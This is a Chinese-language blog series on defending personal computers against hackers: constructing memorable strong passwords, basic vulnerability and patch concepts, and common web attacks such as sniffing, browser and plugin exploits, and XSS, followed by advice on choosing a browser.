<h3 id="◇用英文单词作口令"><a href="#◇用英文单词作口令" class="headerlink" title="◇用英文单词作口令"></a>◇用英文单词作口令</h3><p>　　用【单个】英文单词作口令，也很容易被破解。毕竟，常用的英文单词，也就千把个；算上冷僻的，也就几万个。<br>　　在许多年以前，就有黑客专门收集整理了英文单词的列表（称之为“口令字典”）。而且这个字典是根据单词的使用频度进行排序。有了这种密码破解字典，密码破解程序就可以轻易猜解出那些使用单个英文单词的密码。</p>
<h3 id="◇用日期作口令"><a href="#◇用日期作口令" class="headerlink" title="◇用日期作口令"></a>◇用日期作口令</h3><p>　　有些同学希望用某个具有特殊意义的日期（比如：生日、结婚纪念日…）作为口令。要知道这种伎俩也是不灵滴。因为常见的日期，大都分布在最近100年的范围内。所以充其量，可能的个数也就大约是365*100个。即便把不同的日期表示格式考虑进去，也多不了几倍。在这个数量级上，对于暴力破解工具而言，还是小菜一碟。</p>
<h3 id="◇其它的烂口令"><a href="#◇其它的烂口令" class="headerlink" title="◇其它的烂口令"></a>◇其它的烂口令</h3><p>　　上述列举的这几种情况，大伙儿一定要避免。另外，你还可以去围观一下某老外整理的一个<a target="_blank" rel="noopener" href="http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time">滥口令大全</a>（这老外真有耐心）。提醒一下：这个列表是根据欧美用户统计的，未必适合中国的国情。</p>
<h2 id="★如何构造【复杂】密码？"><a href="#★如何构造【复杂】密码？" class="headerlink" title="★如何构造【复杂】密码？"></a>★如何构造【复杂】密码？</h2><p>　　前面已经说了：口令太简单，容易被破解。但是太复杂的话，万一自己也忘了，那可就完蛋了。所以，很多网友都纠结于口令到底该复杂到什么程度。俺的经验是：<strong>口令要做到对自己简单，对别人复杂。</strong><br>　　下面就来介绍俺在这方面的经验。</p>
<h3 id="◇用多个单词构成词组"><a href="#◇用多个单词构成词组" class="headerlink" title="◇用多个单词构成词组"></a>◇用多个单词构成词组</h3><p>　　前面提到，如果用【单个】英文单词作密码，容易遭受字典攻击。为了避免字典攻击，可以考虑由2<del>5个英文单词构成密码。如果你英语不灵光或你比较习惯中文，也可以考虑用2</del>5个汉字的拼音来构成密码。</p>
<p><strong>优点</strong><br>　　由于能显著增加密码长度，可以抗击暴力破解。<br><strong>缺点</strong><br>　　有可能需要改变你记忆密码的习惯。<br>　　口令中仅包含字母，复杂度不够高。</p>
<h3 id="◇插入特殊字符"><a href="#◇插入特殊字符" class="headerlink" title="◇插入特殊字符"></a>◇插入特殊字符</h3><p>　　刚才提到了用多个单词或汉字拼音构造密码。为了让密码的强度再好一些，还可以在单词或汉字拼音之间，插入一些特殊字符。<br>　　最常见的是插入空格。当然，你也可以考虑插入其它字符（比如：下划线、减号、斜杠、井号、星号、等）。<br>　　通常进行暴力破解时，为了加快破解进度，都只针对字母和数字进行暴力破解。如果你的口令中含有特殊字符，会大大提高攻击者的难度。</p>
<p><strong>优点</strong><br>　　由于口令包含较多特殊符号，复杂度大大提高。<br><strong>缺点</strong><br>　　很多特殊字符的输入，要依赖于 SHIFT 键辅助。对于键盘指法不流畅的同学，可能会影响你输入密码时的击键速度，给偷窥者留下可乘之机。</p>
<h3 id="◇字符变换"><a href="#◇字符变换" class="headerlink" title="◇字符变换"></a>◇字符变换</h3><p>　　所谓的字符变换，就是用形状类似的字母和数字进行相互替换，通过这种变换，可以规避前面提到的基于口令字典的攻击。<br>　　常见的变换有如下几种：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">字母o 和 数字<span class="hljs-number">0</span><br>字母l 和 数字<span class="hljs-number">1</span><br>字母z 和 数字<span class="hljs-number">2</span><br>字母s 和 符号$<br>字母g 和 数字<span class="hljs-number">9</span><br>字母<span class="hljs-selector-tag">q</span> 和 数字<span class="hljs-number">9</span><br>字母<span class="hljs-selector-tag">a</span> 和 符号@<br>字母<span class="hljs-selector-tag">b</span> 和 数字<span class="hljs-number">6</span><br>字母x 和 符号*<br></code></pre></td></tr></table></figure>

<p>　　假设俺想用单词 <code>program</code> 作为口令，那么经过上述的变换之后，就成为 <code>pr09r@m</code><br>　　很明显，变换之后的口令同时具有字母、数字、符号。强度相当好 :)<br>　　以上变换仅仅是举例。你可以对俺给出的这几个变换，进行扩展，以满足自己的习惯与偏好。</p>
<p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　由于口令包含较多特殊符号，复杂度大大提高。<br><strong>缺点</strong><br>　　如果你想好的口令中，恰巧所有字母都没有对应的变换，那就比较不爽啦。</p>
<h3 id="◇键位平移"><a href="#◇键位平移" class="headerlink" title="◇键位平移"></a>◇键位平移</h3><p>　　这个招数也比较简单，就是在进行键盘输入时，把手【向右】平移一个键位。通常咱们在盲打时，两只手的食指分别对着字母 <code>F</code> 和字母 <code>J</code>。平移之后，则食指对着 <code>G</code> 和 <code>K</code>。<br>　　假设俺想用单词 <code>program</code> 作为口令，那么经过上述的变换之后，就成为 <code>[tphts</code><br>　　经过这种输入法，口令已经面目全非。但是对你自己来说，并不难记。</p>
<p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　口令看起来完全没规律。<br><strong>缺点</strong><br>　　依赖于 QWERT 的键盘布局。万一哪天你想在非 QWERT 键盘（比如某些手机键盘）上输入口令，那你就歇菜了。</p>
<h3 id="◇藏头诗"><a href="#◇藏头诗" class="headerlink" title="◇藏头诗"></a>◇藏头诗</h3><p>　　在某些古代小说的情节中，经常可以看见藏头诗的桥段。藏头诗的点子，也可以借用来构造安全口令。<br>　　为了用此招数，你先要想好一句令你印象深刻的话。这话可以是中文，也可以是英文、法文、火星文……反正只要是你熟悉的语言既可。最好这句话的字数（单词数）在8~20之间。然后你把这句话每一个单词的头一个字母取出来，组合成一个口令。如果是中文的话，就把每一个字的拼音的声母取出，组合成口令。<br>　　假设俺想好的话是：“只有偏执狂才能生存”。那么用拼音的声母表示就成为 <code>zypzkcnsc</code></p>
<p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　口令看起来完全没规律。<br><strong>缺点</strong><br>　　口令中仅包含字母，复杂度不够高。<br>　　如果句子中的字数（单词数）不够多，效果就不够好。<br>　　对于港台的同学，由于没学过汉语拼音，只好用英文的藏头诗了。好在港台的英语教育通常比大陆好，应该关系不大 :-)</p>
<h3 id="◇巧用-SHIFT-键"><a href="#◇巧用-SHIFT-键" class="headerlink" title="◇巧用 SHIFT 键"></a>◇巧用 SHIFT 键</h3><p>　　在构造口令的时候，适当地组合一下 SHIFT 键，有时也可以达到不错的效果。假如你的口令中，有部分字符是数字，那当你输入口令时，按住SHIFT键会让这些数字字符变为特殊符号。</p>
<p><strong>优点</strong><br>　　【不用】改变你原先的记忆习惯。<br>　　由于口令包含较多特殊符号，复杂度大大提高。<br><strong>缺点</strong><br>　　万一你原先的口令仅有字母，没有数字，则密码的强度会稍微打折扣。<br>　　由于要依赖于 SHIFT 键进行切换，会影响你输入密码的击键速度。这会给偷窥者留下可乘之机。</p>
<h3 id="◇运用数学等式"><a href="#◇运用数学等式" class="headerlink" title="◇运用数学等式"></a>◇运用数学等式</h3><p>　　还有一种又好记，看起来又复杂的密码构造方式——运用数学等式。<br>　　比如，可以把密码设计成：<code>7+8=15</code><br>　　虽然只有6个字符，但是由于包含了符号，已经有一定的强度。如果你觉得6字符太少，可以很容易增加字符数及复杂度，比如改为：<code>37+(9*2)=55</code><br>　　如果你觉得还不够复杂，还可以搞得再变态一点——把某个数用英文表示。比如：<code>two+7=nine</code></p>
<p><strong>优点</strong><br>　　密码同时包含了字母、数字、符号。标准的高复杂度！<br><strong>缺点</strong><br>　　需要改变你记忆密码的习惯。<br>　　一旦你的口令被别人看到，别人很容易就可以发现你构造口令的规律。</p>
<h3 id="◇利用散列值（哈希函数）"><a href="#◇利用散列值（哈希函数）" class="headerlink" title="◇利用散列值（哈希函数）"></a>◇利用散列值（哈希函数）</h3><p>　　最后，来说一种俺的看家本领——利用散列值构造口令。<br>　　要构造基于散列值的密码，有好几种散列算法可供选择。对于不太懂技术的网友，俺建议用 CRC32 散列算法。为啥用它捏？因为这玩意儿操作起来比较方便。比如，假设俺想得到某个文件的 CRC32 散列值，只要用 7-Zip、WinRAR 之类的压缩工具，把它压缩成 zip 格式的文件，然后就可以看到该文件的 CRC32 值了（因为 zip 格式用 CRC32 散列算法作为文件的校验码）。不信你随便拿手头一个 zip 格式的文件打开来看看就明白鸟。<br>　　因为 CRC32 生成的散列值比较【短】，对于懂技术并且安全要求较高的网友，可以用散列值【更长】的散列算法（比如：MD5、SHA1、SHA256 ……）。<br>　　现在，详细说一下基于散列值的密码如何构造（以 CRC32 为例，其它散列算法依样画葫芦）<br>　　首先，你先想好一个字符串，作为计算散列的种子。这个字符串不需要很复杂，也不需要很长。比方说你叫张三，那你可以拿张三的拼音声母 <code>zs</code> 作为【种子串】（注：此处纯属举例，实际情况中，你应该用【更长】的字符串作为种子串）。<br>　　接下来，假设你有一个 hotmal 的邮箱，需要设置口令。你可以先用记事本（notepad）生成一个 txt 文件。里面先写上种子串 <code>zs</code> 再写上 <code>hotmail</code>，存盘。然后把这个 txt 文件用工具压缩成 zip 格式，看一下它的 CRC32 校验码 <code>9C9041C0</code>，然后就拿它作为密码。<br>　　如果你再有一个 gmail 邮箱需要设置口令，只要同样地，新建一个 txt 文件并写入 <code>zsgmail</code>，同样计算 CRC32，就可以得到另外一个值 <code>03B2F77D</code>。大伙注意到没有？这两个值看起来没有任何关联性，而且从这两个口令，也看不出和种子串 <code>zs</code> 有啥关系。</p>
<p><strong>优点</strong><br>　　密码同时包含了字母、数字，但是没有特殊符号。复杂度属于中高！<br>　　由于散列值具有随机性。也就是说，你看到的绝大多数散列值都没啥规律。<br>　　由于散列值具有不可逆性。也就是说，即便有一个密码暴露了，攻击者也看不出规律。<br>　　即使有一个密码暴露，别人完全看不出规律。<br><strong>缺点</strong><br>　　这种密码是完全随机的，常人是【不可能记住】滴。所以，在密码分级机制中，它仅适合第二级的密码。第三类密码没法这么玩。</p>
<p>　　此招数的进阶：<br>　　1. 你可以把 CRC 算法换成其它散列算法（比如： MD5、SHA1、SHA256 ……），就可以轻易构造出【超长的】密码或口令（几十个字符，甚至上百个字符）。<br>　　2. 如果你自己会写点小程序或小脚本，你可以进行 N 次散列（N 可以是几千或几万）。这样一来，别人拿到你的某个密码后，更加难逆向分析出你的“种子串”。因此也就无法分析出由种子串构造出来的其它密码。</p>
<h2 id="★结尾-1"><a href="#★结尾-1" class="headerlink" title="★结尾"></a>★结尾</h2><p>　　今天又花了不少篇幅，总算把俺平生积累的，关于如何构造复杂密码的经验，都讲完了。如果哪个网友还有其它独到的经验，希望来信和俺分享。如果俺觉得实用，也会补充到本文中。<br>　　本系列的下一个帖子，会说说安全漏洞的基本防范。</p>
<h1 id="如何防止黑客入侵-4-：安全漏洞的基本防范"><a href="#如何防止黑客入侵-4-：安全漏洞的基本防范" class="headerlink" title="如何防止黑客入侵[4]：安全漏洞的基本防范"></a>如何防止黑客入侵[4]：安全漏洞的基本防范</h1><p><strong>文章目录</strong></p>
<p>★扫盲基本概念<br>★安全漏洞的分类<br>★漏洞的防范措施</p>
<p>　　前面用2个帖子来介绍口令方面的安全（在“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2010/06/howto-prevent-hacker-attack-2.html">这里</a>”和“<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2010/06/howto-prevent-hacker-attack-3.html">这里</a>”）。今天扫盲一下跟安全漏洞相关的知识，为下一篇（Web 相关的防范）做好铺垫。考虑到俺博客的读者群，本文主要拿Windows桌面系统来举例，并且尽量说得浅显一点。</p>
<h2 id="★扫盲基本概念"><a href="#★扫盲基本概念" class="headerlink" title="★扫盲基本概念"></a>★扫盲基本概念</h2><h3 id="◇什么是漏洞？"><a href="#◇什么是漏洞？" class="headerlink" title="◇什么是漏洞？"></a>◇什么是漏洞？</h3><p>　　所谓的“漏洞”，简单来说，就是会引起各种问题的软硬件缺陷（软件业的行话叫 Bug）。要知道，任何东西都不可能是完美的，软硬件系统也不例外（毕竟开发软硬件系统的程序员/工程师，也是凡人，也会有出错的时候）。</p>
<h3 id="◇什么是安全漏洞？"><a href="#◇什么是安全漏洞？" class="headerlink" title="◇什么是安全漏洞？"></a>◇什么是安全漏洞？</h3><p>　　在上述提到的缺陷中，那些会被攻击者加以利用的，并因此导致安全问题的缺陷，就是所谓的“安全漏洞”。</p>
<h3 id="◇什么是补丁？"><a href="#◇什么是补丁？" class="headerlink" title="◇什么是补丁？"></a>◇什么是补丁？</h3><p>　　补丁是一个很形象的说法。如果你衣服破了个洞，只要打个补丁，不需要把整件衣服换掉。同样的，如果你的某个软件有漏洞，也只要打一个补丁，不需要重新安装新版本的软件。大多数情况下，补丁和漏洞是配套的。</p>
<h3 id="◇什么是攻击代码-攻击程序？"><a href="#◇什么是攻击代码-攻击程序？" class="headerlink" title="◇什么是攻击代码 / 攻击程序？"></a>◇什么是攻击代码 / 攻击程序？</h3><p>　　为了利用某个安全漏洞，黑客需要运行某个程序，这个程序就叫做攻击程序（也叫“攻击代码”）。通俗地说，攻击程序和补丁之间的关系，就好比矛和盾之间的关系。</p>
<h2 id="★安全漏洞的分类"><a href="#★安全漏洞的分类" class="headerlink" title="★安全漏洞的分类"></a>★安全漏洞的分类</h2><p>　　除了上述的基本概念，你还需要大致知道安全漏洞的分类方式。</p>
<h3 id="◇按照所在软件的类型分类"><a href="#◇按照所在软件的类型分类" class="headerlink" title="◇按照所在软件的类型分类"></a>◇按照所在软件的类型分类</h3><p>　　根据出现漏洞的软件的类型，可以把漏洞分为“操作系统漏洞”、“应用软件漏洞”、“Web 漏洞”等。<br>　　所谓的“操作系统漏洞”，就是操作系统本身有的安全缺陷。<br>　　所谓的“应用软件漏洞”，就是你安装的软件所内含的安全缺陷。<br>　　近几年来，基于 Web 的攻击日益增多，所以把 Web 漏洞单独分一类。所谓的“Web 漏洞”，也就是跟Web相关的漏洞——包括了浏览器本身的漏洞和网站的漏洞（本系列的下一篇会具体介绍这方面的知识）。</p>
<h3 id="◇按照危险级别分类"><a href="#◇按照危险级别分类" class="headerlink" title="◇按照危险级别分类"></a>◇按照危险级别分类</h3><p>　　还可以根据漏洞的危险程度，进行分类。通常按照“高中低”分三级（也有把危险级别定为5级的）。级别越高，就越危险。<br>　　对于高危的漏洞，有可能导致攻击者在你的电脑上植入木马。</p>
<h3 id="◇按照攻击代码的位置分类"><a href="#◇按照攻击代码的位置分类" class="headerlink" title="◇按照攻击代码的位置分类"></a>◇按照攻击代码的位置分类</h3><p>　　针对攻击代码所处的位置，可以把漏洞分为“远程漏洞”、“本地漏洞”两类。<br>　　所谓的“远程漏洞”，就是说，攻击者只需要在另外一台机器运行攻击代码，就可以让你的电脑中招。<br>　　所谓的“本地漏洞”，就是攻击者的攻击代码必须在你的机器上执行。</p>
<h3 id="◇按照补丁的情况分类"><a href="#◇按照补丁的情况分类" class="headerlink" title="◇按照补丁的情况分类"></a>◇按照补丁的情况分类</h3><p>　　刚才已经解释过了“补丁”和“漏洞”之间的关系。<br>　　对于大部分漏洞而言，都有对应的补丁；但是少数漏洞没有补丁。没有补丁的漏洞是很危险的。为啥会出现这种情况捏？俺稍微解释一下。</p>
<p><strong>1. 未公开的漏洞</strong><br>　　有些黑客发现某个漏洞后，没有在圈内公开，也没有告知对应的软件厂商。那么这种漏洞就变成“未公开的漏洞”。因为没有公开，软件厂商不知情，自然也就没有发布补丁。<br>　　这种漏洞【最危险】，有可能长期被攻击者用来入侵。据俺所知，有些高危漏洞已经在黑客圈内流传多年，而相应的软件厂商依然不知情。</p>
<p><strong>2. 零日漏洞（Zero-Day）</strong><br>　　如今互联网很发达，某些资深且勤奋的攻击者可以对漏洞的发布作出快速反应。一旦某个漏洞的细节被公开，他们可以在24小时之内制作出相应的攻击代码。而这个时候，软件厂商多半还没来得及发布补丁。那么这些攻击者就可以利用这个时间差，进行入侵活动。所以，安全圈内也把这种漏洞称为“零日漏洞”（洋文叫：Zero-Day 或 0-Day）。相对于“未公开漏洞”，“零日漏洞”可利用的时间段会短一些。比较负责任的软件厂商通常会在一周或一月之内发布补丁。不过捏，也有些不靠谱的公司（包括大公司），要拖上好几个月才发布漏洞补丁（比如 Oracle）。</p>
<h2 id="★漏洞的防范措施"><a href="#★漏洞的防范措施" class="headerlink" title="★漏洞的防范措施"></a>★漏洞的防范措施</h2><p>　　针对漏洞的这几种不同分类，俺分别介绍一下几种基本的、常见的防范方式。</p>
<h3 id="◇个人防火墙"><a href="#◇个人防火墙" class="headerlink" title="◇个人防火墙"></a>◇个人防火墙</h3><p>　　个人防火墙主要用于防范“远程漏洞”，对于“本地漏洞”，防火墙基本帮不上忙。<br>　　因为大多数远程漏洞，都存在于你机器对外开启的监听端口中。个人防火墙可以阻止这些端口对外开放，从而避免潜在的漏洞被攻击者利用。<br>　　自从 Windows 2000 开始，微软就在操作系统中内置了防火墙功能。对于 Windows XP 以及之后的版本，可以直接到控制面板中开启它。<br>　　如果你的电脑只是用来上上网、聊聊天、看看电影、用用办公软件，那你完全可以把防火墙设置成——不开放任何对外的端口。这样一来，即便你的电脑中存在远程漏洞，也不易被攻击者利用。</p>
<h3 id="◇定期升级系统补丁"><a href="#◇定期升级系统补丁" class="headerlink" title="◇定期升级系统补丁"></a>◇定期升级系统补丁</h3><p>　　Windows 系统的漏洞一直比较多——毕竟用户群太大，容易被黑客盯上。所以从很多年以前，微软就开始定期提供 Windows 补丁。具体的做法是每月的第二个星期二，发布新发现的漏洞的补丁。另外，如何发现高危的漏洞，也会临时发布紧急补丁。<br>　　从 Windows 2000 开始，系统就支持自动的补丁升级机制。你只要在“控制面板”里打开“自动更新”这个功能，然后选择“自动”方式。你一定要确保系统的”自动更新”机制处于启用状态。这就可以堵住很多操作系统漏洞，从而降低攻击的风险。<br>　　提醒一下：自动更新不是 Windows 独有滴。其它一些用户群比较大的桌面系统（比如：Mac OS，Ubuntu）也提供了自动更新安全补丁的功能。</p>
<h3 id="◇启用软件的自动更新"><a href="#◇启用软件的自动更新" class="headerlink" title="◇启用软件的自动更新"></a>◇启用软件的自动更新</h3><p>　　有一些做得比较好的软件，会内置自动更新功能（比如：Firefox、Chrome …），一旦其官方网站有新的版本或补丁，就会自动下载并更新。如果你担心这类软件有安全问题，可以启用它们的自动更新功能。</p>
<h3 id="◇使用小众且活跃的软件"><a href="#◇使用小众且活跃的软件" class="headerlink" title="◇使用小众且活跃的软件"></a>◇使用小众且活跃的软件</h3><p>　　俗话说树大招风。越知名的软件，就越容易引来黑客的注意，被发现安全漏洞的概率也会增大。<br>　　比如说：IE 的用户群最大，针对 IE 漏洞的挂马攻击是各种浏览器中最普遍的；Firefox 相对就少很多；而 Chrome 和 Safari 就更少了（不过捏，随着 Firefox 和 Chrome 的流行，针对这两款浏览器的攻击也多起来了）。<br>　　再比如说：同样是 PDF 阅读器，Adobe Reader 被曝光的漏洞就比较多，相对而言，Foxit Reader 和 PDF-XChange Viewer 就没这么多问题。<br>　　为啥俺还要强调【活跃】捏？小众软件根据活跃程度可以分为：活跃 or 不活跃。不活跃的软件，通常说明：开发者维护该软件不够积极，也就意味着该软件在【漏洞修复】方面不够迅速/及时——这就会导致安全风险；反之，活跃的软件，就没这个问题。</p>
<p>　　关于安全漏洞的基本防范，今天就聊到这里。考虑到近年来，针对 Web 攻击的情况剧增，本系列后续的帖子会说一下 Web 相关的话题。</p>
<h1 id="如何防止黑客入侵-5-：Web相关的防范（上）"><a href="#如何防止黑客入侵-5-：Web相关的防范（上）" class="headerlink" title="如何防止黑客入侵[5]：Web相关的防范（上）"></a>如何防止黑客入侵[5]：Web相关的防范（上）</h1><p><strong>文章目录</strong></p>
<p>★Web安全的重要性<br>★Web 相关的攻击手法<br>★如何选择浏览器？<br>★如何选择插件和扩展？</p>
<p>　　由于俺比较懒，导致本系列已经中断了2年之久。上星期有读者留言，希望俺尽快把本系列补上。再加上昨天看到新闻，说 Java 7 爆出全系列的高危漏洞。凡此种种，促使俺补上了本系列的第5篇，关于 Web 的防范。这部分的内容比较长，为了避免大伙儿阅读疲劳，俺把《Web相关的防范》分为上中下3个部分。</p>
<h2 id="★Web安全的重要性"><a href="#★Web安全的重要性" class="headerlink" title="★Web安全的重要性"></a>★Web安全的重要性</h2><p>　　在聊正题之前，先给大伙儿强调一下“Web 安全”的重要性。<br>　　如今互联网非常普及，大部分的家用电脑和商业电脑，都具备联网功能。而且大部分电脑只要一开机，就处于联网状态。作为电脑的使用者，有相当一部分时间是花在 Web 浏览（俗称网上冲浪）。在这样的环境中，Web 就成了恶意软件（病毒、木马、蠕虫、勒索软件……）最理想的一种传播媒介。据说如今大部分电脑中招，都与 Web 有关。<br>　　正因为如此，才把 Web 相关的内容，单独汇总一篇。接下来，俺先介绍一下攻击者常见的招数，然后再介绍一下各种应对措施。</p>
<h2 id="★Web-相关的攻击手法"><a href="#★Web-相关的攻击手法" class="headerlink" title="★Web 相关的攻击手法"></a>★Web 相关的攻击手法</h2><h3 id="◇嗅探（sniffer）"><a href="#◇嗅探（sniffer）" class="headerlink" title="◇嗅探（sniffer）"></a>◇嗅探（sniffer）</h3><p>　　所谓的“嗅探”，就是攻击者利用某些技术手段，截获你的网络数据流并进行分析，从而获取某些有价值的信息。通常来说，“嗅探”只是入侵的初始阶段（准备阶段）。攻击者通过“嗅探”获取到的信息，通常用来进行辅助后续的入侵行动。</p>
<p>　　举例：<br>　　很多人喜欢通过公共场所的 WiFi 热点上网。假如你使用的 WiFi 热点没有设置为强加密。那么，某个攻击者就有可能利用 WiFi 嗅探工具，截获你的上网流量。如果你正好在收发 Web 邮件，而且没有通过 HTTPS 加密（好多国内的 Web 邮箱【不】支持全程 HTTPS 加密）。那么，攻击者就可以看到你的收发的邮件内容。</p>
<h3 id="◇钓鱼（phishing）"><a href="#◇钓鱼（phishing）" class="headerlink" title="◇钓鱼（phishing）"></a>◇钓鱼（phishing）</h3><p>　　“钓鱼攻击”包括很多种，基于 Web 的网络钓鱼是其中之一。<br>　　由于“钓鱼攻击”属于社会工程学的范畴，也不是本文的重点。今后有空的话，单独写一篇“关于钓鱼攻击的防范”。</p>
<h3 id="◇利用浏览器自身的安全漏洞"><a href="#◇利用浏览器自身的安全漏洞" class="headerlink" title="◇利用浏览器自身的安全漏洞"></a>◇利用浏览器自身的安全漏洞</h3><p>　　在前文里，俺已经扫盲了”漏洞”、”补丁”等概念以及相关的一些常识。健忘的同学，可以再去温习一下。<br>　　在软件行业中，几乎每一款软件都会有漏洞——浏览器自然也不例外。浏览器的漏洞有很多种，其中一类叫做”安全漏洞”。顾名思义，就是会导致安全问题的漏洞。<br>　　如果某款浏览器的安全漏洞被攻击者发现，而浏览器厂商自己还不知晓。那么攻击者就可以利用该漏洞，发起广泛的攻击。</p>
<p>　　举例：<br>　　假设某个黑客研究 IE 的内核，首先发现 IE 存在一个“渲染图片导致缓冲区溢出”的漏洞。由于该漏洞是独家发现，只要该黑客不公开漏洞的信息，连微软（也就是 IE 浏览器的厂商）也会蒙在鼓里。因此，也就【没有】针对该漏洞的补丁。那么，这个黑客会如何利用该漏洞捏？<br>\1. 首先挑选一张图片（为了吸引人，通常会选一张美女图之类的照片），然后精心地嵌入一段攻击代码在图片内部。<br>\2. 把这张图片放到网上（比如张贴到某个大型论坛，再配上一个吸引人的标题）。<br>\3. 过不了多久，就会吸引到很多网友来围观。如果围观的网友用的浏览器不是 IE，那么他仅仅是看到一张美女图而已，不会有啥异样。如果围观的网友用的正好是有漏洞的 IE 版本，当 IE 打开那张图片的瞬间，攻击代码就会被激活（被运行）。然后，攻击代码会悄悄地在这台电脑中安装一个木马（技术行话叫“植入木马”）。之后，这台电脑就成为攻击者的肉鸡了（攻击者可以远程控制肉鸡，为所欲为）。<br>\4. 攻击者控制了肉鸡之后，既可以拿去卖钱（有专门的地下肉鸡交易市场），也可以偷窥机主的隐私（看看有没有网银、裸照、QQ 靓号）。如果控制的肉鸡数量巨大，还可以搞 DDOS 攻击……</p>
<h3 id="◇利用浏览器【插件或扩展】的安全漏洞"><a href="#◇利用浏览器【插件或扩展】的安全漏洞" class="headerlink" title="◇利用浏览器【插件或扩展】的安全漏洞"></a>◇利用浏览器【插件或扩展】的安全漏洞</h3><p>　　如今大部分浏览器上，都安装了插件。最常见的插件就是 Flash 插件。另外还有“PDF 插件、Java 插件”等等。<br>　　浏览器的插件也属于软件，也会存在安全漏洞，因此也可以被攻击者利用。一般来说，攻击者对插件漏洞的利用，类似于对浏览器漏洞的利用。</p>
<p>　　举例1：<br>　　2011年，美国大名鼎鼎的安全公司 RSA 遭到入侵并且被深度渗透，连看家产品 SecureID 的密钥也被偷了。<br>　　攻击者之所以能得手，就是利用了 Flash 插件的一个零日漏洞。洋文好的同学，可以看“<a target="_blank" rel="noopener" href="http://blogs.gartner.com/avivah-litan/2011/04/01/rsa-securid-attack-details-unveiled-they-should-have-known-better/">这里</a>”的详细报道。</p>
<p>　　举例2：<br>　　同样是在去年，有不少 Gmail 用户遭到入侵。但实际上，Gmail 本身并没有出问题。攻击者是利用 Flash 的漏洞，伪造跨站请求，然后在 Gmail 的转发列表中加入一个攻击者的邮箱。之后，被害人收到的所有邮件，都会自动转发给攻击者。</p>
<p>　　从最近几年的趋势来看，插件漏洞导致的安全问题，要多于浏览器漏洞导致的安全问题。</p>
<h3 id="◇跨站脚本攻击（XSS）"><a href="#◇跨站脚本攻击（XSS）" class="headerlink" title="◇跨站脚本攻击（XSS）"></a>◇跨站脚本攻击（XSS）</h3><p>　　最后再来说说”跨站脚本”的问题。<br>　　大部分 XSS 攻击，都是利用网站本身的漏洞。所谓的网站，其实就是若干 Web 服务器，上面运行若干软件。前面说了，只要是软件，就可能存在漏洞（包括安全漏洞）。所以，Web 服务器上的软件自然也不例外。<br>　　基于 XSS 的攻击有很多种类型，具体的技术原理也有所差异。考虑到大部分读者不是搞技术的，俺就不深入展开了。仅举一例，让大伙儿有个感性的认识。</p>
<p>　　举例：<br>　　比如某个 BBS 论坛存在漏洞——【没有】对用户发布的帖子内容（此处的“内容”，不是指文字的内容，而是指特殊字符）进行严格的检查。如果某个攻击者发现了此漏洞，就可以精心构造一个帖子，在帖子的正文中包含一段攻击脚本（通常是 JavaScript）。接下来，攻击者把这个帖子发布到该论坛上。<br>　　然后捏，如果有人浏览了这篇帖子，这段攻击脚本就会被激活，然后干坏事……</p>
<h2 id="★如何选择浏览器？"><a href="#★如何选择浏览器？" class="headerlink" title="★如何选择浏览器？"></a>★如何选择浏览器？</h2><p>　　对于用户来说，浏览器是 Web 的根基。所以，谈 Web 的安全防范，首先得聊一聊如何选择浏览器。<br>　　挑选浏览器有如下几个指标供参考：<br><strong>1. 浏览器的质量好不好</strong><br>评判安全方面的质量，最关键的一条是：看浏览器有没有经常出安全漏洞。<br><strong>2. 浏览器的更新快不快</strong><br>爆出漏洞后，浏览器的开发团队是否及时出补丁或新版本。<br><strong>3. 浏览器的功能强不强</strong><br>除了要看浏览器本身的功能，还要看其支持的扩展是否丰富。</p>
<p>　　根据上述指标，俺把市面上常见的浏览器，根据靠谱的程度，划分为如下三类：</p>
<h3 id="◇第一类：Firefox-和-Chrome（含-Chromium）"><a href="#◇第一类：Firefox-和-Chrome（含-Chromium）" class="headerlink" title="◇第一类：Firefox 和 Chrome（含 Chromium）"></a>◇第一类：Firefox 和 Chrome（含 Chromium）</h3><p>　　俺个人强烈建议用 Firefox 或 Chrome 进行网上冲浪，因为这两款浏览器很符合上述指标。<br><strong>质量好</strong><br>本世纪初，浏览器市场被 IE 一统天下。但随着时间推移，IE 在全球的市场份额逐步被 Chrome ＆ Firefox 占去一半以上。这充分说明 Firefox 和 Chrome 的质量很好。另外，在安全漏洞方面，Firefox 和 Chrome 也优于 IE。<br><strong>更新快</strong><br>说到快速更新（快速迭代），这是 Chrome 的首创。从去年开始，Firefox 也学 Chrome 采用快速版本更新。<br><strong>功能强</strong><br>说到功能，Firefox 刚出道时，利用丰富的扩展吸引了足够多的用户。如今，无论是扩展的种类还是扩展的下载量，Firefox 是最多的；至于 Chrome，由于出道时间晚，这扩展方面不如 Firefox，但显然比 IE 强多了。</p>
<p>　　除了上述这几条，这两款浏览器还具有如下优点：<br><strong>支持的平台很多</strong><br>支持三大主流的桌面系统（Windows、Mac OS、Linux），支持两大主流的移动系统（Android、iOS）。<br><strong>开源项目</strong><br>由于开源而且参与的程序员也多，所以软件中的漏洞容易被及早发现。<br>（Chromium 是开源滴；Chrome 虽然基于 Chromium，但包含【闭源】模块）</p>
<p>　　以上就是俺推荐 Firefox 和 Chrome 的理由。在本文的后续章节，俺会以这两款浏览器为主，进行介绍。</p>
<h3 id="◇第二类：IE、Safari、Opera"><a href="#◇第二类：IE、Safari、Opera" class="headerlink" title="◇第二类：IE、Safari、Opera"></a>◇第二类：IE、Safari、Opera</h3><p>　　先说 Safari 和 Opera。这两款的出道时间早于 Firefox 和 Chrome。忙活了这么多年，如今的市场份额依然很低，这已经说明某些问题。另外，俺个人觉得 Safari 和 Opera 的扩展和插件不够丰富，更新速度也不够快，所以俺不推荐。</p>
